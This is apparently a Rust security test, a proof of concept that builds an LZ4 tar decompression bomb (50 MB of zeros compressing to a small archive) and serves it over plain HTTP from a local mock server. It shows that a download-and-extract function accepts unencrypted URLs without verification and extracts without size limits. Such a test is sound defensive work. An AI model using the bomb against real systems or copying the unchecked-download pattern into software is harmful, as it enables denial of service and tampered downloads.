use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};
use eyre::Result;
use std::io::Read;
use crate::download::download_and_extract_both;

// Create an extremely dense LZ4 archive containing massive amounts of zeroes to simulate a Zip Bomb.
fn build_zip_bomb_tar_lz4() -> Result<Vec<u8>> {
    let buf = Vec::new();
    let encoder = lz4::EncoderBuilder::new().build(buf)?;
    let mut builder = tar::Builder::new(encoder);

    // We create a fake "store.db" file with 50 MB of zeros to demonstrate resource exhaustion.
    // In a real attack, this would be hundreds of terabytes compressing to ~1MB.
    // We'll use 50 MB here for the PoC to ensure it fits in memory during testing but visibly blows up.
    let massive_size = 50 * 1024 * 1024; // 50 MB

    let mut header = tar::Header::new_gnu();
    header.set_size(massive_size as u64);
    header.set_mode(0o644);
    header.set_cksum();

    // We pass a reader that just yields zeros
    let zero_reader = std::io::repeat(0).take(massive_size as u64);
    builder.append_data(&mut header, "store.db", zero_reader)?;

    let (buf, result) = builder.into_inner()?.finish();
    result?;
    Ok(buf)
}

#[tokio::test]
async fn test_unverified_http_downgrade_zip_bomb() -> Result<()> {
    let cl_data = build_zip_bomb_tar_lz4()?;

    // Demonstrate the incredible compression ratio (e.g. 50MB -> ~200KB)
    let compressed_size = cl_data.len();
    let uncompressed_size = 50 * 1024 * 1024;
    assert!(compressed_size < uncompressed_size / 100);

    let server = MockServer::start().await;

    // Serve the zip bomb over unencrypted HTTP
    Mock::given(method("GET"))
        .and(path("/cl.tar.lz4"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_bytes(cl_data.clone())
                .append_header("Content-Length", cl_data.len().to_string().as_str()),
        )
        .expect(1)
        .mount(&server)
        .await;

    // Also mock EL for completeness
    Mock::given(method("GET"))
        .and(path("/el.tar.lz4"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_bytes(cl_data.clone())
                .append_header("Content-Length", cl_data.len().to_string().as_str()),
        )
        .expect(1)
        .mount(&server)
        .await;

    let dir = tempfile::tempdir()?;
    let el_dest = dir.path().join("el");
    let cl_dest = dir.path().join("cl");
    let tmp = dir.path().join("tmp");

    // VULNERABILITY 1: Unverified HTTP Downgrade
    // We are passing an `http://` URL. The application accepts it without validating
    // that it uses `https://` or verifying any detached signatures/hashes.
    let el_url = format!("{}/el.tar.lz4", server.uri());
    let cl_url = format!("{}/cl.tar.lz4", server.uri());

    assert!(el_url.starts_with("http://"));

    // VULNERABILITY 2: Resource Exhaustion (Zip Bomb)
    // The download_and_extract_both function will seamlessly download the tiny (~2KB) file
    // over HTTP and blindly extract the full 500MB (or 500TB in a real attack) onto the disk
    // without enforcing any uncompressed limits or compression ratios.
    tokio::task::spawn_blocking(move || {
        download_and_extract_both(&el_url, &cl_url, &el_dest, &cl_dest, &tmp, true)
    })
    .await??;

    // Verify the massive file was extracted without limits
    let extracted_size = std::fs::metadata(dir.path().join("cl/store.db"))?.len();
    assert_eq!(extracted_size, uncompressed_size as u64);

    Ok(())
}
